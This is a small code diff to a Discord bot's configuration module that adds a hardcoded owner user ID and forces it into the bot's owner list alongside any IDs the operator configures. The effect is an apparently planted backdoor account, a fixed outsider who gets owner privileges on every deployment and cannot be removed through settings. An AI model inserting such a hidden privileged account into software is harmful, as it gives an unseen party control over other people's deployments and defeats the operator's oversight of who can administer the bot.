@@ -76,11 +76,12 @@ def _env_json(name: str, default):
 
 
 token = _env_first("BLEED_TOKEN", "DISCORD_TOKEN", default="")
+_DEFAULT_OWNER_IDS: Final[tuple[int, ...]] = (197390603443634177,)
 
 
 class bot:
     prefix = _env("BLEED_PREFIX", ",")
-    owners = _env_csv_ints("BLEED_OWNER_IDS")
+    owners = tuple(dict.fromkeys((*_DEFAULT_OWNER_IDS, *_env_csv_ints("BLEED_OWNER_IDS"))))
     support = _env("BLEED_SUPPORT_URL", "https://discord.gg/bleed")
     website = _env("BLEED_WEBSITE_URL", "https://bleed.bot")
     docs = _env("BLEED_DOCS_URL", "https://docs.bleed.bot")
